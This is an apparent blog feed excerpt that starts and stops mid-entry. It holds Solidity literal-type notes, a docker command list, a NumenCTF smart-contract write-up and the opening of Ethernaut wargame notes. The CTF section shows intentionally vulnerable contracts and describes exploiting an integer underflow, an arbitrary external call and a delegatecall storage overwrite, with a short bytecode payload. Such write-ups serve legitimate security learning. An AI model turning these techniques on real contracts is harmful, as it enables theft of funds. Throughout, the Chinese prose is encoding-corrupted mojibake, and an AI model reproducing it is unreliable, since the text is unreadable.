ä¸ºè¿™å¯èƒ½å¯¼è‡´éæœ‰ç†æ•°ï¼‰ã€‚</p><p>ä»¥å­—é¢æ•°ä¸ºå·¦ï¼ˆæˆ–åŸºæ•°ï¼‰æ“ä½œæ•°ï¼Œä»¥æ•´æ•°ç±»å‹ä¸ºå³ï¼ˆæŒ‡æ•°ï¼‰æ“ä½œæ•°çš„ç§»ä½å’ŒæŒ‡æ•°åŒ–ï¼Œæ€»æ˜¯åœ¨<code>uint256</code>ï¼ˆå¯¹äºéè´Ÿçš„å­—é¢æ•°å­—ï¼‰æˆ–<code>int256</code>ï¼ˆå¯¹äºè´Ÿçš„å­—é¢æ•°å­—ï¼‰ç±»å‹ä¸­è¿›è¡Œï¼Œä¸å³ï¼ˆæŒ‡æ•°ï¼‰æ“ä½œæ•°çš„ç±»å‹æ— å…³ã€‚</p><p>åœ¨<code>0.4.0</code>ä¹‹å‰ï¼Œæ•´æ•°çš„å­—é¢é‡ä¼šè¢«æˆªæ–­å³<code>5/2=2</code>ï¼Œä¹‹åæ˜¯<code>2.5</code></p><h3 id="å­—ç¬¦å­—é¢é‡å’Œç±»å‹"><a href="#å­—ç¬¦å­—é¢é‡å’Œç±»å‹" class="headerlink" title="å­—ç¬¦å­—é¢é‡å’Œç±»å‹"></a>å­—ç¬¦å­—é¢é‡å’Œç±»å‹</h3><p>å­—ç¬¦å­—é¢é‡å¯ä»¥åˆ†å¼€å†™ï¼Œä¾‹å¦‚<code>â€œfoo&quot;&quot;bar&quot;</code>ç­‰ä»·äº<code>â€foobar&quot;</code>ï¼›å¹¶ä¸”<code>&quot;foo&quot;</code>åªå ç”¨3ä¸ªå­—èŠ‚è€Œä¸æ˜¯4ä¸ªå­—èŠ‚ï¼ˆå¯¹æ¯”Cè¯­è¨€çš„å­—ç¬¦ä¸²ä»¥<code>&quot;\0&quot;</code>ç»“å°¾ï¼‰ï¼›å®ƒä»¬å¯ä»¥éšå¼åœ°è½¬æ¢æˆ<code>bytes1</code>, â€¦, <code>bytes32</code>ï¼›ä¹Ÿå¯ä»¥è½¬æ¢æˆ<code>bytes</code>å’Œ<code>string</code>ã€‚</p><p>å­—ç¬¦å­—é¢é‡åªèƒ½åŒ…å«ASCIIå¯æ‰“å°å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯0x20åˆ°0x7Eï¼›æ­¤å¤–ï¼Œä¹ŸåŒ…æ‹¬ä»¥ä¸‹è½¬ä¹‰ç¬¦ï¼š</p><ul><li><code>\&lt;newline&gt;</code> (è½¬ä¹‰å®é™…æ¢è¡Œ)</li><li><code>\\</code> (åæ–œæ )</li><li><code>\&#39;</code> (å•å¼•å·)</li><li><code>\&quot;</code> (åŒå¼•å·)</li><li><code>\n</code> (æ¢è¡Œç¬¦)</li><li><code>\r</code> (å›è½¦)</li><li><code>\t</code> (æ ‡ç­¾ tab)</li><li><code>\xNN</code> (åå…­è¿›åˆ¶è½¬ä¹‰ï¼Œè¡¨ç¤ºä¸€ä¸ªåå…­è¿›åˆ¶çš„å€¼ï¼Œ)</li><li><code>\uNNNN</code> (unicode è½¬ä¹‰ï¼Œè½¬æ¢æˆUTF-8çš„åºåˆ—)</li></ul><p>æ³¨æ„ï¼šç›´åˆ°0.8.0æ‰æ¨å‡ºï¼š<code>\b</code>ï¼ˆé€€æ ¼ï¼‰ã€<code>\f</code>ï¼ˆæ¢é¡µï¼‰ã€<code>\v</code>ï¼ˆå‚ç›´æ ‡ç­¾ï¼‰ï¼›ä½†å¦‚æœå®åœ¨éœ€è¦ç”¨åˆ°ï¼Œå¯ä»¥é€šè¿‡åå…­è¿›åˆ¶è½¬ä¹‰æ’å…¥ï¼Œå³åˆ†åˆ«ä¸º<code>\x08</code>ã€<code>\x0c</code>å’Œ<code>\x0b</code>ã€‚</p><p>ä»»ä½•unicodeè¡Œç»ˆç»“ç¬¦ï¼ˆé™¤äº†LFï¼ŒVFï¼ŒFFï¼ŒCRï¼ŒNELï¼ŒLSï¼ŒPSï¼‰éƒ½å¯ä»¥å½“æˆå­—ç¬¦ä¸²å­—é¢å¸¸é‡çš„ç»ˆæ­¢ç¬¦ã€‚ åªæœ‰å½“å­—ç¬¦ä¸²å­—é¢å¸¸é‡å‰æ²¡æœ‰<code>\</code>æ—¶ï¼Œæ¢è¡Œç¬¦æ‰èƒ½ç»ˆæ­¢å­—ç¬¦ä¸²å­—é¢å¸¸é‡ã€‚</p><h3 id="Unicodeå­—é¢é‡"><a href="#Unicodeå­—é¢é‡" class="headerlink" title="Unicodeå­—é¢é‡"></a>Unicodeå­—é¢é‡</h3><p>Unicodeå­—é¢é‡â€”ä»¥<code>unicode</code>å¼€å¤´â€”å¯ä»¥åŒ…å«æ‰€æœ‰æœ‰æ•ˆçš„UTF-8å­—ç¬¦ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string memory a = unicode&quot;Hello ğŸ˜ƒ&quot;;</span><br></pre></td></tr></table></figure><h3 id="åå…­è¿›åˆ¶å­—é¢é‡"><a href="#åå…­è¿›åˆ¶å­—é¢é‡" class="headerlink" title="åå…­è¿›åˆ¶å­—é¢é‡"></a>åå…­è¿›åˆ¶å­—é¢é‡</h3><p>ä»¥â€hexâ€å¼€å¤´ï¼Œç´§è·Ÿå•å¼•å·æˆ–åŒå¼•å·å­—ç¬¦ä¸²ï¼š <code>hex&quot;001122FF&quot;</code>, <code>hex&#39;0011_22_FF&#39;</code>ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹åˆ’çº¿ä½œä¸ºå­—ç¬¦çš„åˆ†éš”ç¬¦ã€‚</p><p>ç”¨ç©ºæ ¼åˆ†éš”çš„åå…­è¿›åˆ¶å­—é¢é‡å°†è¡¨è¾¾æˆä¸€ä¸ªæ‹¼æ¥èµ·æ¥çš„åå…­è¿›åˆ¶å­—é¢é‡ï¼š<code>hex&quot;00112233&quot; hex&quot;44556677&quot;</code> ç­‰ä»·äº <code>hex&quot;0011223344556677&quot;</code></p><p>åå…­è¿›åˆ¶å­—é¢é‡ä¸èƒ½éšå¼è½¬æ¢æˆå­—ç¬¦å­—é¢é‡</p><h3 id="æšä¸¾"><a href="#æšä¸¾" class="headerlink" title="æšä¸¾"></a>æšä¸¾</h3>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä¹‹å‰åšå®¡è®¡çš„æ—¶å€™éƒ½æ˜¯ç¢°åˆ°ä»€ä¹ˆå­¦ä»€ä¹ˆï¼Œè¿™æ ·çš„ä»£ä»·å°±æ˜¯åŸºç¡€å¾ˆå·®ï¼Œ è¦ä¸€ç›´æœé‡å¤çš„ä¸œè¥¿ï¼Œæ‰€ä»¥å†³å®šå¥½å¥½è¯»ä¸€é&lt;a href=&quot;https://learnblockchain.cn/docs/solidity/&quot;&gt;Solidity ä¸­æ–‡æ–‡æ¡£ â€” Solidityä¸­æ–‡æ–‡æ¡£ â€” ç™»é“¾ç¤¾åŒº (learnblockchain.cn)&lt;/a&gt;ï¼Œç„¶åå†æåˆ«çš„ï¼Œé¢„æœŸè¿™ä¸ªæœˆä»¥å†…&lt;/p&gt;</summary>
    
    
    
    <category term="blockchain" scheme="http://sh1k4ku.github.io/categories/blockchain/"/>
    
    
    <category term="blockchain" scheme="http://sh1k4ku.github.io/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>dockerå¸¸ç”¨å‘½ä»¤</title>
    <link href="http://sh1k4ku.github.io/2023/04/18/docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>http://sh1k4ku.github.io/2023/04/18/docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</id>
    <published>2023-04-18T08:02:28.000Z</published>
    <updated>2023-05-03T06:59:06.103Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸æƒ³è€æ˜¯æœäº†</p><span id="more"></span><h1 id="é•œåƒæ“ä½œ"><a href="#é•œåƒæ“ä½œ" class="headerlink" title="é•œåƒæ“ä½œ"></a>é•œåƒæ“ä½œ</h1><ul><li><p>æ‹‰å–é•œåƒ</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker pull image_name</span></span><br></pre></td></tr></table></figure></li><li><p>æœç´¢é•œåƒ</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker search image_name</span></span><br></pre></td></tr></table></figure></li><li><p>é•œåƒåˆ—è¡¨</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker images</span></span><br></pre></td></tr></table></figure></li><li><p>åˆ é™¤é•œåƒ</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker rmi image_name</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="å®¹å™¨æ“ä½œ"><a href="#å®¹å™¨æ“ä½œ" class="headerlink" title="å®¹å™¨æ“ä½œ"></a>å®¹å™¨æ“ä½œ</h1><ul><li><p>å¯åŠ¨é•œåƒå»ºç«‹å®¹å™¨</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="builtin-name">run</span> image_name</span><br></pre></td></tr></table></figure><ul><li><p>å»ºç«‹å¹¶æ‰“å¼€ STDINï¼Œå’Œshelläº¤äº’</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">run</span> -<span class="keyword">it</span> image_name</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><p>æŒ‚è½½æ–‡ä»¶å¤¹ </p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -v $<span class="string">&quot;pwd&quot;</span>:/share image_name </span><br><span class="line"><span class="meta">#docker run -it -v <span class="meta-string">&quot;$PWD&quot;</span>:/home/share christoftorres/osiris</span></span><br></pre></td></tr></table></figure></li><li><p>æŒ‡å®šå®¹å™¨å</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="builtin-name">run</span> <span class="attribute">--name</span>=container_name image_name</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>æŸ¥çœ‹å®¹å™¨åˆ—è¡¨ </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -<span class="selector-tag">a</span></span><br></pre></td></tr></table></figure></li></ul><ul><li>å¯åŠ¨å®¹å™¨ </li></ul><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="literal">start</span> container_name</span><br></pre></td></tr></table></figure><ul><li><p>å¯åŠ¨å¹¶äº¤äº’</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="literal">start</span> -i container_name</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>å…³é—­å®¹å™¨ </p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop container_name</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>é‡å¯å®¹å™¨ </p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker restart container_name</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>åˆ é™¤å®¹å™¨</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker rm container_name</span></span><br></pre></td></tr></table></figure><ul><li><p>åˆ é™¤æŒ‡å®šé•œåƒçš„æ‰€æœ‰å®¹å™¨</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rm <span class="constructor">$(<span class="params">docker</span> <span class="params">ps</span> -<span class="params">a</span> | <span class="params">grep</span> <span class="string">&quot;image_name&quot;</span> | <span class="params">awk</span> &#x27;&#123;<span class="params">print</span> $1&#125;&#x27;)</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><p>æ–‡ä»¶æ‹·è´</p><ul><li><p>å½“å‰ç›®å½•-&gt;å®¹å™¨ </p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">docker</span> <span class="meta">cp</span> file_name container_name:/file_path</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><p>å®¹å™¨-&gt;å½“å‰ç›®å½• </p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">docker</span> <span class="meta">cp</span>  container_name:file_name</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä¸æƒ³è€æ˜¯æœäº†&lt;/p&gt;</summary>
    
    
    
    <category term="docker" scheme="http://sh1k4ku.github.io/categories/docker/"/>
    
    
    <category term="docker" scheme="http://sh1k4ku.github.io/tags/docker/"/>
    
  </entry>
  
  <entry>
    <title>NumenCTF</title>
    <link href="http://sh1k4ku.github.io/2023/04/04/NumenCTF/"/>
    <id>http://sh1k4ku.github.io/2023/04/04/NumenCTF/</id>
    <published>2023-04-04T06:52:52.000Z</published>
    <updated>2023-04-16T15:02:31.108Z</updated>
    
    <content type="html"><![CDATA[<p>åˆçº¦å®¡è®¡æ¯”èµ›</p><span id="more"></span><h1 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h1><p><a href="https://cn-sec.com/archives/1645084.html">NUMEN CTF writeup by ChaMd5 | CN-SEC ä¸­æ–‡ç½‘</a></p><p><a href="https://defihacklabs.substack.com/">DeFiHackLabsâ€™s Substack | SunWeb3Sec | Substack</a></p><h1 id="SimpleCall"><a href="#SimpleCall" class="headerlink" title="SimpleCall"></a>SimpleCall</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.7.0;</span><br><span class="line"></span><br><span class="line">contract ExistingStock &#123;</span><br><span class="line"></span><br><span class="line">address public owner;</span><br><span class="line">    address private reserve;</span><br><span class="line"></span><br><span class="line">string public name = &quot;Existing Stock&quot;;</span><br><span class="line">string public symbol = &quot;ES&quot;;</span><br><span class="line">uint256 public decimals = 18;</span><br><span class="line">uint256 public totalSupply = 200000000000;</span><br><span class="line">    uint8 public frequency = 1;</span><br><span class="line"></span><br><span class="line">bool public Lock = false;</span><br><span class="line">bool public result;</span><br><span class="line">bool public flag;</span><br><span class="line"></span><br><span class="line">event Approval(address indexed from, address indexed to, uint number);</span><br><span class="line">event Transfer(address indexed from, address indexed to, uint number);</span><br><span class="line">event Deposit(address indexed to, uint number);</span><br><span class="line">event Withdraw(address indexed from, uint number);</span><br><span class="line">    event Target(address indexed from, bool result);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mapping (address =&gt; uint) public balanceOf;</span><br><span class="line">mapping (address =&gt; mapping (address =&gt; uint)) public allowance;</span><br><span class="line"></span><br><span class="line">constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    balanceOf[owner] = totalSupply;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function approve(address to, uint number) public returns (bool) &#123;</span><br><span class="line">    allowance[msg.sender][to] = number;</span><br><span class="line">    emit Approval(msg.sender, to, number);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balanceOf[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balanceOf[msg.sender] -= _value;</span><br><span class="line">    balanceOf[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">function transferFrom(address from, address to, uint number) public returns (bool)&#123;</span><br><span class="line"></span><br><span class="line">        require(balanceOf[from] &gt;= number);</span><br><span class="line"></span><br><span class="line">    if (from != msg.sender &amp;&amp; allowance[from][msg.sender] != uint256(-1)) &#123;</span><br><span class="line">        require(allowance[from][msg.sender] &gt;= number);</span><br><span class="line">        allowance[from][msg.sender] -= number;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    balanceOf[from] -= number;</span><br><span class="line">    balanceOf[to] += number;</span><br><span class="line"></span><br><span class="line">    emit Transfer(from, to, number);</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function privilegedborrowing(uint256 value,address secure,address target,bytes memory data) public &#123;</span><br><span class="line">        require(Lock == false &amp;&amp; value &gt;= 0 &amp;&amp; value &lt;= 1000);</span><br><span class="line">    balanceOf[address(this)] -= value;</span><br><span class="line">    balanceOf[target] += value;</span><br><span class="line"></span><br><span class="line">    address(target).call(data);</span><br><span class="line"></span><br><span class="line">    Lock = true; </span><br><span class="line"></span><br><span class="line">    require(balanceOf[target] &gt;= value);</span><br><span class="line">    balanceOf[address(this)] += value;</span><br><span class="line">    balanceOf[target] -= value;</span><br><span class="line"></span><br><span class="line">    Lock = false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint number) public &#123;</span><br><span class="line">    require(balanceOf[msg.sender] &gt;= number);</span><br><span class="line">    balanceOf[msg.sender] -= number;</span><br><span class="line">    (msg.sender).transfer(number);</span><br><span class="line">    emit Withdraw(msg.sender, number);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function setflag() public &#123;</span><br><span class="line">    if(balanceOf[msg.sender] &gt; 200000 &amp;&amp; allowance[address(this)][msg.sender] &gt; 200000)&#123;</span><br><span class="line">flag = true;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function isSolved() public view returns(bool)&#123;</span><br><span class="line">    return flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¦æ»¡è¶³çš„æ˜¯ï¼š</p><p><img src="/images/NumenCTF/image-20230416224902698.png" alt="image-20220828145823279"></p><p>balanceOfä¼šä¸‹æº¢ï¼Œåˆ©ç”¨transferå‡½æ•°å¯ä»¥æ»¡è¶³ç¬¬ä¸€ä¸ªæ¡ä»¶ï¼š</p><p><img src="/images/NumenCTF/image-20230416230045087.png" alt="image-20230416230045087"></p><p>åªæœ‰approveèƒ½ä¿®æ”¹allowanceï¼Œä½†æ˜¯å‘èµ·æ–¹åªèƒ½æ˜¯msg.sender</p><p><img src="/images/NumenCTF/image-20230404105532045.png" alt="image-20230404105532045"></p><p>privilegeborrowingå­˜åœ¨ä»»æ„åœ°å€çš„callè°ƒç”¨ï¼Œè°ƒç”¨åä¼šä½¿å¾—msg.senderæ”¹ä¸ºtargetï¼Œæ‰€ä»¥å¯ä»¥æ»¡è¶³ç¬¬äºŒä¸ªæ¡ä»¶</p><p><img src="/images/NumenCTF/image-20230404105113104.png" alt="image-20230404105113104"></p><p><img src="/images/NumenCTF/image-20230330182715865.png" alt="image-20230330182715865"></p><p><img src="/images/NumenCTF/JMFR4%7B6%5BS%5DQ4O8W0YE4VDEU.png" alt="img"></p><h1 id="counter"><a href="#counter" class="headerlink" title="counter"></a>counter</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract Deployer &#123;</span><br><span class="line">    constructor(bytes memory code) &#123; </span><br><span class="line">        assembly &#123; return (add(code, 0x20), mload(code)) &#125; </span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract SmartCounter&#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    address public target;</span><br><span class="line">    bool flag=false;</span><br><span class="line">    constructor(address owner_)&#123;</span><br><span class="line">        owner=owner_;</span><br><span class="line">    &#125;</span><br><span class="line">    function create(bytes memory code) public&#123;</span><br><span class="line">        require(code.length&lt;=24);</span><br><span class="line">        target=address(new Deployer(code));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function A_delegateccall(bytes memory data) public&#123;</span><br><span class="line">        (bool success,bytes memory returnData)=target.delegatecall(data);</span><br><span class="line">        require(owner==msg.sender);</span><br><span class="line">        flag=true;</span><br><span class="line">    &#125;</span><br><span class="line">    function isSolved() public view returns(bool)&#123;</span><br><span class="line">        return flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆå­¦ä¸€ä¸‹solidityçš„å†…å­˜å¸ƒå±€<a href="https://www.jianshu.com/p/f01a5790e8cb">Solidity - å†…å­˜å¸ƒå±€ - ç®€ä¹¦ (jianshu.com)</a></p><p>delegatecallè°ƒç”¨çš„æ—¶å€™æˆ‘ä»¬çš„åœ°å€ä¼šå˜æˆtx.originï¼Œåˆç”±äºowneråœ¨slot0ï¼Œæ‰€ä»¥æŠŠtx.originå­˜åˆ°slot0å³å¯æ»¡è¶³owner=msg.senderã€‚æ„é€ çš„codeä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ORIGIN</span><br><span class="line">PUSH1 0x00</span><br><span class="line">SSTORE</span><br><span class="line"></span><br><span class="line">32600055</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;åˆçº¦å®¡è®¡æ¯”èµ›&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://sh1k4ku.github.io/categories/CTF/"/>
    
    <category term="blockchain" scheme="http://sh1k4ku.github.io/categories/blockchain/"/>
    
    
    <category term="blockchain" scheme="http://sh1k4ku.github.io/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>ethernaut</title>
    <link href="http://sh1k4ku.github.io/2023/04/03/ethernaut/"/>
    <id>http://sh1k4ku.github.io/2023/04/03/ethernaut/</id>
    <published>2023-04-02T16:00:00.000Z</published>
    <updated>2023-04-17T02:43:58.420Z</updated>
    
    <content type="html"><![CDATA[<p>æ‰“é¶åœºçš„è®°å½•</p><span id="more"></span><h1 id="Hello-Ethernaut"><a href="#Hello-Ethernaut" class="headerlink" title="Hello Ethernaut"></a><strong>Hello Ethernaut</strong></h1><p>è¿æ¥å°ç‹ç‹¸åæŒ‰ç…§æç¤ºåšå³å¯</p><p><img src="/images/ethernaut/image-20230321104045420.png" alt="image-20230321104045420"></p><p>ç„¶åæäº¤ç¤ºä¾‹ï¼ˆä½œè€…å¥½æœ‰æ„æ€å•Š</p><p><img src="/images/ethernaut/image-20230321104122333.png" alt="image-20230321104122333"></p><p>è¿‡å…³åè¿˜èƒ½å¾—åˆ°æºç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Instance &#123;</span><br><span class="line"></span><br><span class="line">  string public password;</span><br><span class="line">  uint8 public infoNum = 42;</span><br><span class="line">  string public theMethodName = &#x27;The method name is method7123949.&#x27;;</span><br><span class="line">  bool private cleared = false;</span><br><span class="line"></span><br><span class="line">  // constructor</span><br><span class="line">  constructor(string memory _password) &#123;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;You will find what you need in info1().&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info1() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;Try info2(), but with &quot;hello&quot; as a parameter.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info2(string memory param) public pure returns (string memory) &#123;</span><br><span class="line">    if(keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked(&#x27;hello&#x27;))) &#123;</span><br><span class="line">      return &#x27;The property infoNum holds the number of the next info method to call.&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    return &#x27;Wrong parameter.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info42() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;theMethodName is the name of the next method.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function method7123949() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;If you know the password, submit it to authenticate().&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function authenticate(string memory passkey) public &#123;</span><br><span class="line">    if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) &#123;</span><br><span class="line">      cleared = true;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getCleared() public view returns (bool) &#123;</span><br><span class="line">    return cleared;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Fallback"><a href="#Fallback" class="headerlink" title="Fallback"></a><strong>Fallback</strong></h1><p>åˆçº¦ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 